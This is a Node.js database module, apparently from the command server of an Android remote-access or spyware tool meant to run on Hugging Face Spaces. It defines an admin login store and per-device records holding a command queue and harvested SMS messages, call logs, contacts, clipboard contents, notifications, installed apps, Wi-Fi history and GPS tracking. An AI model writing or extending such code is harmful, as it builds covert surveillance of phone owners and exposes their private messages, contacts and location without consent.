const lowdb = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');
const fs = require('fs');

// Always use /tmp for Hugging Face Spaces
const writableDir = '/tmp';

// Ensure subfolders exist
if (!fs.existsSync(writableDir)) fs.mkdirSync(writableDir);
if (!fs.existsSync(path.join(writableDir, 'clientData'))) {
  fs.mkdirSync(path.join(writableDir, 'clientData'));
}

const mainDbPath = path.join(writableDir, 'maindb.json');
const adapter = new FileSync(mainDbPath);
const db = lowdb(adapter);

db.defaults({
  admin: {
    username: 'admin',
    password: '',
    loginToken: '',
    logs: [],
    ipLog: []
  },
  clients: []
}).write();

class clientdb {
  constructor(clientID) {
    const clientDbPath = path.join(writableDir, 'clientData', `${clientID}.json`);
    const cdb = lowdb(new FileSync(clientDbPath));
    cdb.defaults({
      clientID,
      CommandQue: [],
      SMSData: [],
      CallData: [],
      contacts: [],
      wifiNow: [],
      wifiLog: [],
      clipboardLog: [],
      notificationLog: [],
      enabledPermissions: [],
      apps: [],
      GPSData: [],
      GPSSettings: { updateFrequency: 0 },
      downloads: [],
      currentFolder: []
    }).write();
    return cdb;
  }
}

module.exports = {
  maindb: db,
  clientdb: clientdb,
};
